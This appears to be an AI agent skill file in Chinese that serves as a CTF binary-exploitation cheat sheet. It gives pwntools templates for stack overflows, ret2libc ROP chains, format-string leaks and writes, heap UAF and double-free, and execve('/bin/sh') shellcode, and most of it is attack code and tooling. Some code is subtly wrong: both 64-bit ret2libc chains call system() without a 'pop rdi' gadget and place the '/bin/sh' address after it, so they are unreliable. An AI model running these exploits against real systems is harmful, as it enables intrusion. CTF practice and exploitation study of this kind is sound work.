---
name: ctf-pwn
description: CTF Pwn二进制漏洞利用。触发：栈溢出/ROP/格式化字符串/堆漏洞/Shellcode编写/ret2libc/checksec等场景。
---

# ctf-pwn — CTF Pwn二进制漏洞利用

## 1. 基础工具链

```bash
# 文件分析
file pwn
checksec pwn              # 检查保护机制
rabin2 -I pwn             # 详细二进制信息
```

**检查项**：
- **NX**（No-eXecute）：栈是否可执行
- **PIE**（Position Independent Executable）：地址随机化
- **RELRO**（RELocation Read-Only）：GOT 表是否可写
- **Canary**：栈保护金丝雀

## 2. 漏洞类型

### 栈溢出（Stack Overflow）

**无保护（无 NX/无 PIE/无 Canary）**
```python
from pwn import *

p = process('./pwn')
# 找溢出偏移
payload = cyclic(200)
p.sendline(payload)
# 或用 pwntools
cyclic_find(0x6161616c)

# 计算溢出
offset = 72
payload = flat([
    b'A' * offset,
    p64(0xdeadbeef)   # 覆盖返回地址
])
p.sendline(payload)
p.interactive()
```

**ROP（Return-Oriented Programming）**
```python
# ret2libc（无 PIE）
libc = ELF('./libc.so.6')
libc.address = LIBC_BASE

payload = flat([
    b'A' * offset,
    p64(ret_addr),
    p64(libc.sym['system']),
    p64(next(libc.search(b'/bin/sh'))),
    p64(0)
])
```

### 格式化字符串（Format String）

```python
# 泄露地址
payload = b'%x.' * 10
payload = b'%7$x'            # 泄露第7个参数

# 写入（格式化写）
# %n：将已打印字符数写入指定地址
payload = b'A' * 0x20 + b'%n' + p64(0x404100)
```

### 堆漏洞

**Use-After-Free（UAF）**
```python
p.sendline(b'2')  # delete
p.sendline(b'3')  # show（此时 chunk 已释放）
```

**Double Free**
```python
p.sendline(b'2')  # delete chunk A
p.sendline(b'2')  # 再次 delete（触发 double free）
```

### House of 系列

```python
# House of Spirit: 释放一个伪造的 chunk 到 fastbin
# House of Force: 溢出 top chunk，改写其大小
# House of Lore: 修改 smallbin fd/bk 链
# House of Einherjar: 溢出绕过 top chunk 边界
```

## 3. Shellcode 编写

### 64位 Linux Shellcode

```asm
xor rsi, rsi
xor rdx, rdx
mov rax, 0x68732f6e69622f   ; /bin/sh (reversed)
push rax
mov rdi, rsp
mov rax, 59                 ; execve
syscall
```

```python
from pwn import *
shellcode = asm(shellcraft.amd64.linux.sh())
```

## 4. ret2libc 攻击链

```python
from pwn import *

elf = ELF('./pwn')
libc = ELF('./libc.so.6')

p = process('./pwn')

# Step 1: 泄露 libc 地址
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.symbols['main']

payload = flat([
    b'A' * offset,
    p64(puts_plt),
    p64(main),
    p64(puts_got)
])
p.sendline(payload)
p.recvline()
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym['puts']

# Step 2: 获取 Shell
payload = flat([
    b'A' * offset,
    p64(ret_addr),
    p64(libc.sym['system']),
    p64(0),
    p64(next(libc.search(b'/bin/sh')))
])
p.sendline(payload)
p.interactive()
```

## 5. 常用 Gadget 查找

```bash
# ROPgadget
ROPgadget --binary ./pwn --only "pop|ret" --no-jmp
ROPgadget --binary ./pwn --string "/bin/sh"

# one_gadget（找 execve("/bin/sh",0,0) 单步 gadget）
one_gadget libc.so.6
```

## 6. 动态调试（gdb + pwndbg）

```bash
gdb ./pwn
# 或 pwndbg
pwndbg ./pwn

# 设置 args
set args input
# 运行
run
# attach
attach $(pid)

# 查看栈
stack 20
# 查看堆
heap
# 断点
break *0x401234
break main
```

## 7. 快速解题模板

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./pwn')
# p = remote('host', port)

# 找偏移
# offset = cyclic_find(p.recv()[-4:])
offset = 72

payload = flat([
    b'A' * offset,
    p64(gadget),
    ...
])

p.sendline(payload)
p.interactive()
```
